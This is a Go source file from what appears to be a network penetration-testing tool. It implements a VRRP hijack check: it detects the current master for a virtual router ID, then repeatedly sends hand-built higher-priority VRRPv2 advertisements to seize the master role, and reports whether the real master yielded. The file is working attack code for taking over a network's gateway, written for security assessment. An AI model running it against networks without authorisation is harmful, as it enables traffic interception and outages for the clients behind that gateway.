// vrrp.go implements the VRRP virtual-router hijack check. Impact
// temporary, restore decay with no stated bound, affects clients: the
// advertisements with a higher priority claim the master role for the
// virtual router, and the real master takes it back on its own
// advertisement timer once the run stops sending.
//
// VRRPv2 rides directly on IP (protocol 112), not UDP. gopacket's VRRPv2
// decoder has no SerializeTo, so the body is built as raw bytes: the
// RFC 3768 section 5.1 layout with the checksum section 5.3.8 defines (the
// one's complement of the one's complement sum of the whole message, the
// checksum field zero while summing) and the eight Authentication Data
// octets of section 5.3.10, zero. The receiver discards an advertisement
// whose checksum fails (section 7.1).

package fh

import (
	"bytes"
	"context"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"net"
	"time"

	"github.com/gopacket/gopacket/layers"

	"go.aledante.io/FlowSeer/src/common/errs"
	"go.aledante.io/FlowSeer/src/edge/netpen/check"
	"go.aledante.io/FlowSeer/src/edge/netpen/link"
)

// The VRRP timers the check runs on: the Advertisement_Interval default of
// RFC 3768 section 6.1, the silence that proves the master yielded (three
// intervals, the Master_Down_Interval of section 6.1 without the skew
// time, plus one interval), and the shortest window that holds the
// pre-read and that silence.
const (
	vrrpAdvertInterval = time.Second
	vrrpMasterSilence  = 3*vrrpAdvertInterval + vrrpAdvertInterval
	vrrpMinWindow      = vrrpAdvertInterval + vrrpMasterSilence
	vrrpPriority       = 120
)

type vrrpFinding struct {
	Action   string   `json:"action"`
	VRID     uint8    `json:"vrid"`
	Priority uint8    `json:"priority"`
	VIPs     []string `json:"vips"`
}

// RunVRRP reads the leg for one advertisement interval for an
// advertisement for the target's VRID from another sender with a priority
// below the probe's 120, then sends its own advertisement every interval
// until the window ends. The predicate is the master's silence: no
// advertisement from it for three intervals plus one after the first
// probe confirms (RFC 3768 section 6.4.3: a Master that receives a higher
// priority transitions to Backup), one that keeps advertising is resisted.
// No advertisement for the VRID in the pre-read is pending, since there is
// no master to depose, and a window under 5 s is pending naming the window
// to pass.
func RunVRRP(ctx context.Context, deps check.Deps) (check.Verdict, error) {
	if err := deps.Target.Need(check.FieldVRID, check.FieldVirtualIP); err != nil {
		return check.Verdict{}, err
	}
	if deps.Observe < vrrpMinWindow {
		return check.Pending(fmt.Sprintf("the window %s is shorter than the %s the check needs: pass --observe 6s", deps.Observe, vrrpMinWindow)), nil
	}
	addr := deps.AttackLeg.Addr()
	vrid := deps.Target.VRID
	vips := []net.IP{deps.Target.VirtualIP}

	var master net.HardwareAddr
	_, pre, err := check.First(ctx, deps.AttackLeg, min(vrrpAdvertInterval, deps.Observe), func(data []byte) bool {
		adv, from, ok := isVRRPAdvertFor(data, vrid, addr.MAC)
		if !ok || adv.Priority >= vrrpPriority {
			return false
		}
		master = from
		return true
	})
	if err != nil {
		if ctx.Err() != nil {
			return check.Verdict{}, ctx.Err()
		}
		return check.Verdict{}, errs.Wrap(err, "vrrp: receive advertisement")
	}
	if master == nil {
		return check.Pending(fmt.Sprintf("no master for VRID %d in %s", vrid, pre.Elapsed.Round(time.Millisecond))), nil
	}

	pkt, err := craftVRRP(addr, vrid, vrrpPriority, vips)
	if err != nil {
		return check.Verdict{}, errs.Wrap(err, "vrrp: craft advertisement")
	}

	lastSeen := time.Now()
	_, obs, err := check.Sustain(ctx, deps.AttackLeg, deps.Observe-pre.Elapsed, vrrpAdvertInterval,
		func(ctx context.Context) error {
			if err := deps.AttackLeg.Send(ctx, pkt); err != nil {
				return errs.Wrap(err, "vrrp: send advertisement")
			}
			return nil
		},
		func(data []byte) bool {
			_, from, ok := isVRRPAdvertFor(data, vrid, addr.MAC)
			if ok && bytes.Equal(from, master) {
				lastSeen = time.Now()
			}
			return false
		})
	if err != nil {
		if ctx.Err() != nil {
			return check.Verdict{}, ctx.Err()
		}
		return check.Verdict{}, errs.Wrap(err, "vrrp: receive after the advertisement")
	}

	vipStrs := make([]string, len(vips))
	for i, v := range vips {
		vipStrs[i] = v.String()
	}
	detail, _ := json.Marshal(vrrpFinding{
		Action:   "vrrp-takeover",
		VRID:     vrid,
		Priority: vrrpPriority,
		VIPs:     vipStrs,
	})
	deps.Emitter.Finding("vrrp", detail)

	observed := pre.Elapsed + obs.Elapsed
	if silence := time.Since(lastSeen); silence >= vrrpMasterSilence {
		return check.Confirmed(fmt.Sprintf("the master for VRID %d fell silent for %s after the advertisement", vrid, silence.Round(time.Millisecond)), observed), nil
	}
	return check.Resisted(fmt.Sprintf("the master for VRID %d kept advertising", vrid), observed), nil
}

// craftVRRP builds a VRRPv2 advertisement: Ethernet → IPv4(224.0.0.18,
// ttl=255, proto=112) → VRRP body with the checksum computed.
func craftVRRP(addr link.Addr, vrid, priority uint8, vips []net.IP) ([]byte, error) {
	// Header: Version|Type(1) | VRID(1) | Priority(1) | CountIP(1)
	//         | AuthType(1) | AdverInt(1) | Checksum(2) | IP(s)
	//         | Authentication Data(8)
	body := make([]byte, 8+4*len(vips)+8)
	body[0] = 0x21 // version=2, type=1 (advertisement)
	body[1] = vrid
	body[2] = priority
	body[3] = byte(len(vips))
	body[4] = 0 // auth type
	body[5] = 1 // adver interval
	for i, vip := range vips {
		copy(body[8+4*i:], vip.To4())
	}
	binary.BigEndian.PutUint16(body[6:8], vrrpChecksum(body))

	eth := &layers.Ethernet{
		DstMAC:       vrrpDstMAC,
		SrcMAC:       addr.MAC,
		EthernetType: layers.EthernetTypeIPv4,
	}
	ip := &layers.IPv4{
		Version:  4,
		IHL:      5,
		TTL:      255,
		Protocol: layers.IPProtocolVRRP,
		SrcIP:    addr.IPv4,
		DstIP:    net.IPv4(224, 0, 0, 18),
		Length:   20 + uint16(len(body)),
	}
	return craftL3Payload(eth, ip, body)
}

// vrrpChecksum is the RFC 3768 section 5.3.8 checksum of body: the 16-bit
// one's complement of the one's complement sum of the whole message, the
// checksum field read as zero.
func vrrpChecksum(body []byte) uint16 {
	var sum uint32
	for i := 0; i+1 < len(body); i += 2 {
		if i == 6 {
			continue
		}
		sum += uint32(binary.BigEndian.Uint16(body[i:]))
	}
	if len(body)%2 == 1 {
		sum += uint32(body[len(body)-1]) << 8
	}
	for sum>>16 != 0 {
		sum = (sum & 0xffff) + (sum >> 16)
	}
	return ^uint16(sum)
}
